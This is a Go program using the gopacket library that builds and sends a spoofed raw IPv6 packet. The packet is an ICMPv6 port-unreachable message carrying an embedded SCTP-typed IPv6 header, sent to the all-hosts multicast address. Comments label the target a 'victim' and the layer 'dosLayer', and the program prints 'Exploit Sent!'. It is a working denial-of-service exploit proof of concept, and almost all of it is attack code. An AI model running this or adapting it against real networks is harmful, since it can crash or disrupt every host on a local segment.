package main

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	device       string = "en0"
	snapshot_len int32  = 65535
	promiscuous  bool   = false
	err          error
	timeout      time.Duration = -1 * time.Second
	handle       *pcap.Handle
)

func main() {
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x8c, 0x85, 0x90, 0xFF, 0xFF, 0xFF},
		DstMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // sends frames to broadcast address
		EthernetType: layers.EthernetTypeIPv6,
	}

	ipLayer := &layers.IPv6{
		Version:    6,
		SrcIP:      net.ParseIP("fe80::4f3:165:123:123"),
		DstIP:      net.ParseIP("ff02::1"), // victim but this is multicast address for all hosts
		NextHeader: layers.IPProtocolICMPv6,
	}

	icmpLayer := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(1, 4),
	}

	icmpLayer.SetNetworkLayerForChecksum(ipLayer)

	dosLayer := &layers.IPv6{
		Version:    6,
		SrcIP:      net.ParseIP("fe80::4f3:165:123:123"),
		DstIP:      net.ParseIP("ff02::1"), // victim but this is multicast address for all hosts
		NextHeader: layers.IPProtocolSCTP,
	}

	// Using these options are ideal when crafting packets in golang when you're not defining all the fields
	// that encompasses an IPv6, or ICMP header
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buffer := gopacket.NewSerializeBuffer()

	gopacket.SerializeLayers(buffer, opts,
		ethernetLayer,
		ipLayer,
		icmpLayer,
		dosLayer,
	)

	err = handle.WritePacketData(buffer.Bytes())
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Exploit Sent!")
}
